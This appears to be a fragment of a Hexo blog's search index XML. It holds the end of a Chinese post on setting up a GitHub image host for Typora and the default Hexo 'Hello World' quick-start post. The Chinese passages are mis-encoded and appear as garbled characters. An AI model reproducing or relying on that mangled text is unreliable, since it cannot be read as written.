src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425135339804.png" alt="image-20220425135339804"></p><p>token å°±æ˜¯ github çš„è®¿é—® tokenï¼Œåˆ†æ”¯æŒ‰ç…§åˆ›å»ºä»“åº“æ—¶çš„åˆ†æ”¯å¡«å†™ï¼Œä»“åº“åç§°æ˜¯ [ç”¨æˆ·å&#x2F;ä»“åº“å] çš„å½¢å¼ã€‚</p><p>æœ€ååœ¨ typora è®¾ç½®ä¸­è®¾ç½®è‡ªåŠ¨ç”Ÿæˆå›¾åºŠé“¾æ¥ã€‚ç‚¹å‡»ã€Œåå¥½è®¾ç½®ã€ï¼Œè®¾ç½®å¦‚ä¸‹å†…å®¹ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425135810193.png" alt="image-20220425135810193"></p><p>ç„¶ååœ¨ typora ä¸­ç²˜è´´å›¾ç‰‡å°±å¯ä»¥ä¸Šä¼ åˆ°å›¾åºŠå•¦ï¼Œæœ€åå†æ¬¡éƒ¨ç½²hexoï¼Œæ•´ä¸ªè¿‡ç¨‹å°±å®Œæˆäº†ã€‚</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/26625249">GitHub+Hexo æ­å»ºä¸ªäººç½‘ç«™è¯¦ç»†æ•™ç¨‹</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">hexoä¸­æ–‡æ‰‹å†Œ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å®‰è£…ç¯å¢ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/24/hello-world/"/>
      <url>/2022/04/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
